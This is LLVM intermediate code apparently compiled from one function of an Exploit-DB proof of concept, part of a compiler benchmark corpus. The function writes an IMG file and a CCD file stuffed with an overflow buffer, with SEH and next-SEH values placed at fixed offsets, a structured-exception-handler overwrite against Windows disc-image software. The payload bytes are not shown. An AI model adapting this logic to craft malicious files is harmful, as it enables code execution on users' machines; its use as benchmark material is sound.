; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_11363.c_exploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_11363.c_exploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@img = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [26 x i8] c"[!]Img file is: %d bytes\0A\00", align 1
@.str.2 = private unnamed_addr constant [23 x i8] c"error writing img file\00", align 1
@overflow = common dso_local global i64 0, align 8
@seh = common dso_local global i32 0, align 4
@nseh = common dso_local global i32 0, align 4
@ccd = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [23 x i8] c"error writing ccd file\00", align 1
@.str.4 = private unnamed_addr constant [26 x i8] c"[!]CCD file is: %d bytes\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @exploit(i8* %0, i8* %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32*, align 8
  %7 = alloca i32*, align 8
  %8 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %9 = load i8*, i8** %3, align 8
  %10 = call i32* @fopen(i8* %9, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0))
  store i32* %10, i32** %6, align 8
  %11 = load i32*, i32** %6, align 8
  %12 = icmp ne i32* %11, null
  br i1 %12, label %13, label %26

13:                                               ; preds = %2
  %14 = load i64, i64* @img, align 8
  %15 = load i32*, i32** %6, align 8
  %16 = call i32 @fwrite(i64 %14, i32 1, i32 109974, i32* %15)
  %17 = load i32*, i32** %6, align 8
  %18 = load i8*, i8** %3, align 8
  %19 = call i32 @getFsize(i32* %17, i8* %18)
  store i32 %19, i32* %5, align 4
  %20 = load i32, i32* %5, align 4
  %21 = call i32 @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.1, i64 0, i64 0), i32 %20)
  %22 = load i32*, i32** %6, align 8
  %23 = call i32 @fclose(i32* %22)
  %24 = load i64, i64* @img, align 8
  %25 = call i32 @free(i64 %24)
  br label %29

26:                                               ; preds = %2
  %27 = call i32 @print(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0))
  %28 = call i32 @exit(i32 0) #3
  unreachable

29:                                               ; preds = %13
  %30 = load i64, i64* @overflow, align 8
  %31 = call i32 @gen_random(i64 %30, i32 10974)
  %32 = load i64, i64* @overflow, align 8
  %33 = add nsw i64 %32, 5067
  %34 = load i32, i32* @seh, align 4
  %35 = call i32 @memcpy(i64 %33, i32 %34, i32 4)
  %36 = load i64, i64* @overflow, align 8
  %37 = add nsw i64 %36, 5063
  %38 = load i32, i32* @nseh, align 4
  %39 = call i32 @memcpy(i64 %37, i32 %38, i32 4)
  %40 = load i8*, i8** %4, align 8
  %41 = call i32* @fopen(i8* %40, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0))
  store i32* %41, i32** %7, align 8
  %42 = load i32*, i32** %7, align 8
  %43 = icmp ne i32* %42, null
  br i1 %43, label %44, label %61

44:                                               ; preds = %29
  %45 = load i64, i64* @ccd, align 8
  %46 = load i64, i64* @ccd, align 8
  %47 = call i32 @strlen(i64 %46)
  %48 = load i32*, i32** %7, align 8
  %49 = call i32 @fwrite(i64 %45, i32 1, i32 %47, i32* %48)
  %50 = load i64, i64* @overflow, align 8
  %51 = load i64, i64* @overflow, align 8
  %52 = call i32 @strlen(i64 %51)
  %53 = load i32*, i32** %7, align 8
  %54 = call i32 @fwrite(i64 %50, i32 1, i32 %52, i32* %53)
  %55 = load i32*, i32** %7, align 8
  %56 = call i32 @fclose(i32* %55)
  %57 = load i64, i64* @ccd, align 8
  %58 = call i32 @free(i64 %57)
  %59 = load i64, i64* @overflow, align 8
  %60 = call i32 @free(i64 %59)
  br label %64

61:                                               ; preds = %29
  %62 = call i32 @print(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i64 0, i64 0))
  %63 = call i32 @exit(i32 0) #3
  unreachable

64:                                               ; preds = %44
  %65 = load i32*, i32** %7, align 8
  %66 = load i8*, i8** %4, align 8
  %67 = call i32 @getFsize(i32* %65, i8* %66)
  store i32 %67, i32* %8, align 4
  %68 = load i32, i32* %8, align 4
  %69 = call i32 @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.4, i64 0, i64 0), i32 %68)
  ret void
}

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fwrite(i64, i32, i32, i32*) #1

declare dso_local i32 @getFsize(i32*, i8*) #1

declare dso_local i32 @printf(i8*, i32) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @free(i64) #1

declare dso_local i32 @print(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @gen_random(i64, i32) #1

declare dso_local i32 @memcpy(i64, i32, i32) #1

declare dso_local i32 @strlen(i64) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
